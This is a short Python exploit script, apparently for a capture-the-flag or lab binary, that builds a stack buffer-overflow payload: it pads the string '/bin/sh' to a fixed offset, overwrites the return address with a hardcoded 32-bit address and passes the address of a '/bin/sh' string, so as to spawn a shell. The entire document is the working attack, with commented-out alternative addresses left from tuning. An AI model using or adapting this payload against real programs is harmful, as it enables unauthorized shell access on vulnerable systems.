import sys

# buf_addr = 0xfff6a046
binsh_addr = 0x080b884d
# syscall_addr = 0x08051520
syscall_addr = 0x0804a052
exit_addr = 0x08050700

shellname = b"/bin/sh"
user_input = shellname + b"\"" * (30-4-4 - len(shellname))
# user_input += exit_addr.to_bytes(4, "little")
user_input += syscall_addr.to_bytes(4, "little")
user_input += binsh_addr.to_bytes(4, "little")

sys.stdout.buffer.write(user_input)